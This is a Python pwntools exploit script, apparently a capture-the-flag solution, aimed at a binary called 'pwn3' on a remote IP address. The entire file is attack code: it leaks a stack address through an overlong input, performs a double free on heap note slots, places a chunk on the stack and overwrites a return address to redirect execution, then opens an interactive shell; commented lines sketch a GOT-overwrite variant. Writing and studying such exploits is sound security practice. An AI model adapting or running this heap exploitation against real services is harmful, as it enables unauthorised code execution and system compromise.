#coding:utf-8
from pwn import *
debug = 0
#context.log_level='debug'
elf = ELF('./pwn3')
#libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./pwn3')#,env={'LD_PRELOAD':'/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so'})
#    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('47.104.16.75',8999)#    
#    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
#    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def add_paper(index,len,name):
	p.recvuntil('2 delete paper\n')
	p.sendline('1')
	p.recvuntil('Input the index you want to store(0-9):')
	p.sendline(str(index))
	p.recvuntil('How long you will enter:')
	p.sendline(str(len))
	p.recvuntil('please enter your content:')
	p.sendline(name)

def delete_paper(index):
	p.recvuntil('2 delete paper\n')
	p.sendline('2')
	p.recvuntil('which paper you want to delete,please enter it\'s index(0-9):')
	p.sendline(str(index))

p.recvuntil('2 delete paper\n')
p.sendline('a'*48*3)
data = p.recvuntil('\x7f')
stack = data[-6:] + '\x00\x00'
stack_addr = u64(stack)
success('stack_addr:'+hex(stack_addr))

# success('free_got:'+hex(elf.got['free']))
# success('malloc_got:'+hex(elf.got['malloc']))
# success('printf_got:'+hex(elf.got['printf']))
# success('puts_got:'+hex(elf.got['puts']))
# #success('puts_got:'+hex(elf.got['puts']))

add_paper(5,32,'aaaa')
add_paper(6,32,'aaaa')
delete_paper(5)
delete_paper(6)
delete_paper(5)

p.recvuntil('2 delete paper\n')
p.sendline('3')
p.recvuntil('enter your luck number:')
p.sendline('66')

add_paper(5,32,p64(stack_addr+96))
add_paper(6,32,'a'*32)
add_paper(6,32,'a'*32)
#z()
add_paper(6,32,'a'*8 + p64(0x400943))

#sleep(0.2)
p.sendline('5')
p.interactive()

# #z()
# #payload = p64(0x601f50 - 8)#0x6020ad - 8)*4#0x601f50
# payload = p64(0x601f50 - 8)*4
# #payload = p64(0x6020ad - 8)*4
# add_paper(7,0x30,payload)
# #z()
# add_paper(8,0x30,'aaaa')
# add_paper(9,0x30,'aaaa')
# payload = '\x00'*(0x6020b8 - 0x6020b5)
# payload += p64(0x602000 + 8)*4#p64(elf.got['free'])*4
# z()
# #dd_paper(5,0x0,payload)
# #0x601f10
# #z()
# p.interactive()
# gef➤  x/g 0x601f92
# 0x601f92:	0x40
#z()
#0x6020ad <stdin@@GLIBC_2.2.5+5>:	0x7f

